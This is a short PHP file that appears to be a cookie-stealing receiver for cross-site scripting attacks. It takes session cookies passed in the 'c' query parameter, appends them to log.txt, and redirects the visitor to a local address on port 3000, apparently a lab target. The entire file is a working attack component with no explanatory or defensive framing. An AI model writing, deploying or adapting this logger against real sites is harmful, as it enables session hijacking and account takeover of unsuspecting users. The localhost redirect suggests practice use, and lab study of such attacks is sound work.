<?php
header ('Location:http://127.0.0.1:3000/');
	$cookies = $_GET["c"];
	$file = fopen('log.txt', 'a');
	fwrite($file, $cookies . "\n\n");
?>
